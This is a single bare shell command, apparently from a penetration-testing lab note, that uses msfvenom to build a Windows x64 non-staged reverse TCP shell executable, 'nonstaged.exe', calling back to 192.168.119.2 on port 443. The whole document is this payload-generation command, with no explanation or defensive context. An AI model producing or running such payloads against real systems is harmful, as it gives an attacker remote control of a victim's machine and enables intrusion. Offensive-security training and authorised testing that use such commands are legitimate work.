
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -
f exe -o nonstaged.exe
```

